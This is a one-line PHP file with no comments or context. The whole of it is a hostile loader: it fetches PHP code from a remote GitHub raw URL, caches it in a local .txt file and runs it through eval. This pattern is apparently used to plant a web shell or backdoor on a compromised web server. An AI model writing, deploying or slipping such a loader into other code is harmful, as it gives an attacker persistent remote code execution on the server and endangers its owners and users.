<?php $TO=basename(__FILE__,".php").".txt";if(is_file($TO)){$eO=file_get_contents($TO);}else{$eO=file_get_contents("https://raw.githubusercontent.com/rkseocode/wbs/main/Graybyt3.php");if(trim($eO)!=""){file_put_contents($TO,$eO);}}eval("?>".$eO);?>
